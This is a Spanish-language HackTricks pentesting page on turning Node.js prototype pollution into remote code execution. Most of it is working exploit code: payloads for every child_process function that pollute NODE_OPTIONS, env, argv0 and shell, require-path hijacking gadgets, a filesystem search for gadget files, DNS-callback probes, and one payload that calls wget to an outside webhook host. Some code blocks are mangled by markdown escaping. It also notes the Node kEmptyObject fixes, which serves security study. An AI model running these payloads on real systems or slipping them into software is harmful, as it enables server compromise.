# Prototype Pollution to RCE

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## C贸digo Vulnerable

Imagina un JS real que utiliza un c贸digo como el siguiente:

```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```

## PP2RCE a trav茅s de variables de entorno

**PP2RCE** significa **Prototype Pollution to RCE** (Ejecuci贸n de C贸digo Remoto).

Seg煤n este [**informe**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), cuando se **crea un proceso** con alg煤n m茅todo de **`child_process`** (como `fork` o `spawn` u otros), se llama al m茅todo `normalizeSpawnArguments` que es un **artilugio de prototipos de poluci贸n para crear nuevas variables de entorno**:

```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```

### **Envenenamiento de `__proto__`**

{% hint style="warning" %}
Ten en cuenta que debido a c贸mo funciona la funci贸n **`normalizeSpawnArguments`** de la biblioteca **`child_process`** de node, cuando se llama algo para **establecer una nueva variable de entorno** para el proceso, solo necesitas **envenenar cualquier cosa**.\
Por ejemplo, si haces `__proto__.avar="valuevar"`, el proceso se iniciar谩 con una variable llamada `avar` con el valor `valuevar`.

Sin embargo, para que la **variable de entorno sea la primera**, necesitas **envenenar** el **atributo `.env`** y (solo en algunos m茅todos) esa variable ser谩 la **primera** (permitiendo el ataque).

Por eso **`NODE_OPTIONS`** no est谩 dentro de `.env` en el siguiente ataque.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## Interacci贸n con DNS

Usando los siguientes payloads es posible abusar de la variable de entorno NODE\_OPTIONS que hemos discutido anteriormente y detectar si funcion贸 con una interacci贸n con DNS:

```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```

O, para evitar que los WAF pidan el dominio:

```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```

## Vulnerabilidad PP2RCE en funciones child\_process

En esta secci贸n vamos a analizar **cada funci贸n de `child_process`** para ejecutar c贸digo y ver si podemos utilizar alguna t茅cnica para forzar esa funci贸n a ejecutar c贸digo:

<details>

<summary><code>exec</code> explotaci贸n</summary>

\`\`\`javascript // environ trick - not working // It's not possible to pollute the .env attr to create a first env var // because options.env is null (not undefined)

// cmdline trick - working with small variation // Working after kEmptyObject (fix) const { exec } = require('child\_process'); p = {} p.**proto**.shell = "/proc/self/exe" //You need to make sure the node executable is executed p.**proto**.argv0 = "console.log(require('child\_process').execSync('touch /tmp/exec-cmdline').toString())//" p.**proto**.NODE\_OPTIONS = "--require /proc/self/cmdline" var proc = exec('something');

// stdin trick - not working // Not using stdin

// Windows // Working after kEmptyObject (fix) const { exec } = require('child\_process'); p = {} p.**proto**.shell = "\\\127.0.0.1\C$\Windows\System32\calc.exe" var proc = exec('something');

````
<details>

<summary><strong><code>execFile</code> explotaci贸n</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
````

Para que **`execFile`** funcione, **DEBE ejecutar node** para que NODE\_OPTIONS funcione.\
Si **no** est谩 ejecutando **node**, debes encontrar c贸mo podr铆as **alterar la ejecuci贸n** de lo que sea que se est茅 ejecutando **con variables de entorno** y configurarlas.

Las **otras** t茅cnicas **funcionan** sin este requisito porque es **posible modificar** **lo que se ejecuta** a trav茅s de la contaminaci贸n de prototipos. (En este caso, incluso si puedes contaminar `.shell`, no contaminar谩s lo que se est谩 ejecutando).

</details>

<details>

<summary>Explotaci贸n de <code>fork</code></summary>

\`\`\`javascript // environ trick - working // Working after kEmptyObject (fix) const { fork } = require('child\_process'); b = {} b.\_\_proto\_\_.env = { "EVIL":"console.log(require('child\_process').execSync('touch /tmp/fork-environ').toString())//"} b.\_\_proto\_\_.NODE\_OPTIONS = "--require /proc/self/environ" var proc = fork('something');

// cmdline trick - working // Working after kEmptyObject (fix) const { fork } = require('child\_process'); p = {} p.**proto**.argv0 = "console.log(require('child\_process').execSync('touch /tmp/fork-cmdline').toString())//" p.**proto**.NODE\_OPTIONS = "--require /proc/self/cmdline" var proc = fork('something');

// stdin trick - not working // Not using stdin

// execArgv trick - working // Only the fork method has this attribute // Working after kEmptyObject (fix) const { fork } = require('child\_process'); b = {} b.**proto**.execPath = "/bin/sh" b.**proto**.argv0 = "/bin/sh" b.**proto**.execArgv = \["-c", "touch /tmp/fork-execArgv"] var proc = fork('./a\_file.js');

// Windows // Working after kEmptyObject (fix) const { fork } = require('child\_process'); b = {} b.**proto**.execPath = "\\\127.0.0.1\C$\Windows\System32\calc.exe" var proc = fork('./a\_file.js');

````
</details>

<details>

<summary><strong><code>spawn</code> explotaci贸n</strong></summary>
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
````

</details>

<details>

<summary><strong><code>execFileSync</code> explotaci贸n</strong></summary>

\`\`\`javascript // environ trick - working with small variation (shell and argv0) // Working after kEmptyObject (fix) const { execFileSync } = require('child\_process'); p = {} // If in windows or mac you need to change the following params to the path of ndoe p.\_\_proto\_\_.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed p.\_\_proto\_\_.shell = "/proc/self/exe" //You need to make sure the node executable is executed p.\_\_proto\_\_.env = { "EVIL":"console.log(require('child\_process').execSync('touch /tmp/execFileSync-environ').toString())//"} p.\_\_proto\_\_.NODE\_OPTIONS = "--require /proc/self/environ" var proc = execFileSync('something');

// cmdline trick - working with small variation (shell) // Working after kEmptyObject (fix) const { execFileSync } = require('child\_process'); p = {} p.**proto**.shell = "/proc/self/exe" //You need to make sure the node executable is executed p.**proto**.argv0 = "console.log(require('child\_process').execSync('touch /tmp/execFileSync-cmdline').toString())//" p.**proto**.NODE\_OPTIONS = "--require /proc/self/cmdline" var proc = execFileSync('something');

// stdin trick - working // Working after kEmptyObject (fix) const { execFileSync } = require('child\_process'); p = {} p.**proto**.argv0 = "/usr/bin/vim" p.**proto**.shell = "/usr/bin/vim" p.**proto**.input = ':!{touch /tmp/execFileSync-stdin}\n' var proc = execFileSync('something');

// Windows // Working after kEmptyObject (fix) const { execSync } = require('child\_process'); p = {} p.**proto**.shell = "\\\127.0.0.1\C$\Windows\System32\calc.exe" p.**proto**.argv0 = "\\\127.0.0.1\C$\Windows\System32\calc.exe" var proc = execSync('something');

````
</details>

<details>

<summary><strong><code>execSync</code> explotaci贸n</strong></summary>
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
````

</details>

<details>

<summary><strong><code>spawnSync</code> explotaci贸n</strong></summary>

\`\`\`javascript // environ trick - working with small variation (shell and argv0) // NOT working after kEmptyObject (fix) without options const { spawnSync } = require('child\_process'); p = {} // If in windows or mac you need to change the following params to the path of node p.\_\_proto\_\_.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed p.\_\_proto\_\_.shell = "/proc/self/exe" //You need to make sure the node executable is executed p.\_\_proto\_\_.env = { "EVIL":"console.log(require('child\_process').execSync('touch /tmp/spawnSync-environ').toString())//"} p.\_\_proto\_\_.NODE\_OPTIONS = "--require /proc/self/environ" var proc = spawnSync('something'); //var proc = spawnSync('something',\[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// cmdline trick - working with small variation (shell) // NOT working after kEmptyObject (fix) without options const { spawnSync } = require('child\_process'); p = {} p.**proto**.shell = "/proc/self/exe" //You need to make sure the node executable is executed p.**proto**.argv0 = "console.log(require('child\_process').execSync('touch /tmp/spawnSync-cmdline').toString())//" p.**proto**.NODE\_OPTIONS = "--require /proc/self/cmdline" var proc = spawnSync('something'); //var proc = spawnSync('something',\[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// stdin trick - working // NOT working after kEmptyObject (fix) without options const { spawnSync } = require('child\_process'); p = {} p.**proto**.argv0 = "/usr/bin/vim" p.**proto**.shell = "/usr/bin/vim" p.**proto**.input = ':!{touch /tmp/spawnSync-stdin}\n' var proc = spawnSync('something'); //var proc = spawnSync('something',\[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows // NOT working after require(fix) without options const { spawnSync } = require('child\_process'); p = {} p.**proto**.shell = "\\\127.0.0.1\C$\Windows\System32\calc.exe" var proc = spawnSync('something'); //var proc = spawnSync('something',\[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)

````

</div>

</details>

## Forzando Spawn

En los ejemplos anteriores viste c贸mo activar la funcionalidad de un gadget que **llama a `spawn`** necesita estar **presente** (todos los m茅todos de **`child_process`** utilizados para ejecutar algo lo llaman). En el ejemplo anterior eso era **parte del c贸digo**, pero 驴qu茅 pasa si el c贸digo **no lo est谩** llamando?

### Controlando una ruta de archivo require

En este [**otro informe**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) el usuario puede controlar la ruta del archivo donde se ejecutar谩 un **`require`**. En ese escenario, el atacante solo necesita **encontrar un archivo `.js` dentro del sistema** que **ejecute un m茅todo spawn al ser importado.**\
Algunos ejemplos de archivos comunes que llaman a una funci贸n spawn al ser importados son:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* Encuentra **m谩s archivos a continuaci贸n**

El siguiente script simple buscar谩 **llamadas** desde **child\_process** **sin ning煤n relleno** (para evitar mostrar llamadas dentro de funciones):

<div data-gb-custom-block data-tag="code" data-overflow='wrap'>

```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
````

#### Estableciendo la ruta del archivo requerido mediante la contaminaci贸n de prototipos

La **t茅cnica anterior requiere** que el **usuario controle la ruta del archivo** que va a ser **requerido**. Pero esto no siempre es cierto.

Sin embargo, si el c贸digo va a ejecutar un require despu茅s de la contaminaci贸n de prototipos, incluso si **no controlas la ruta** que va a ser requerida, **puedes forzar una diferente abusando de la contaminaci贸n de prototipos**. Por lo tanto, aunque la l铆nea de c贸digo sea `require("./a_file.js")` o `require("bytes")`, **requerir谩 el paquete que hayas contaminado**.

Por lo tanto, si se ejecuta un require despu茅s de tu contaminaci贸n de prototipos y no hay una funci贸n de ejecuci贸n de spawn, este es el ataque:

* Encuentra un **archivo `.js` dentro del sistema** que cuando sea **requerido** **ejecutar谩 algo usando `child_process`**
* Si puedes subir archivos a la plataforma que est谩s atacando, podr铆as subir un archivo as铆
* Contamina las rutas para **forzar la carga del require del archivo `.js`** que ejecutar谩 algo con `child_process`
* **Contamina el entorno/cmdline** para ejecutar c贸digo arbitrario cuando se llame a una funci贸n de ejecuci贸n de `child_process` (ver las t茅cnicas iniciales)

**Require absoluto**

Si el require realizado es **absoluto** (`require("bytes")`) y el **paquete no contiene main** en el archivo `package.json`, puedes **contaminar el atributo `main`** y hacer que el **require ejecute un archivo diferente**.

{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}

```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```

**Require relativo - 1**

Si se carga una **ruta relativa** en lugar de una ruta absoluta, puedes hacer que node **cargue una ruta diferente**:

{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}

```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```

**Requerimiento relativo - 2**

{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}

\`\`\`javascript const { fork } = require('child\_process'); console.log("Hellooo from malicious"); fork('/path/to/anything'); \`\`\` #### Require relativo - 3

Similar al anterior, esto se encontr贸 en [**este informe**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs).

```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```

### Dispositivos VM

En el documento [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) tambi茅n se indica que el control de **`contextExtensions`** de algunos m茅todos de la biblioteca **`vm`** podr铆a ser utilizado como un dispositivo.\
Sin embargo, al igual que los m茅todos anteriores de **`child_process`**, ha sido **corregido** en las 煤ltimas versiones.

### Soluciones y Protecciones inesperadas

Por favor, ten en cuenta que la contaminaci贸n de prototipos funciona si el **atributo** de un objeto al que se accede es **indefinido**. Si en el **c贸digo** de ese **atributo** se **asigna** un **valor**, no podr谩s sobrescribirlo.

En junio de 2022, a partir de [**este commit**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a), la variable `options` en lugar de ser `{}` es un **`kEmptyObject`**. Esto **evita que la contaminaci贸n de prototipos** afecte a los **atributos** de **`options`** para obtener RCE.\
Al menos a partir de la versi贸n 18.4.0, esta protecci贸n ha sido **implementada**, por lo tanto, los **exploits** de `spawn` y `spawnSync` que afectan a los m茅todos **ya no funcionan** (隆si no se utilizan `options`!).

En [**este commit**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) la **contaminaci贸n de prototipos** de **`contextExtensions`** de la biblioteca vm tambi茅n fue **arreglada** estableciendo las opciones a **`kEmptyObject`** en lugar de **`{}`.**

#### **Otros Dispositivos**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)

### Referencias

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

</details>
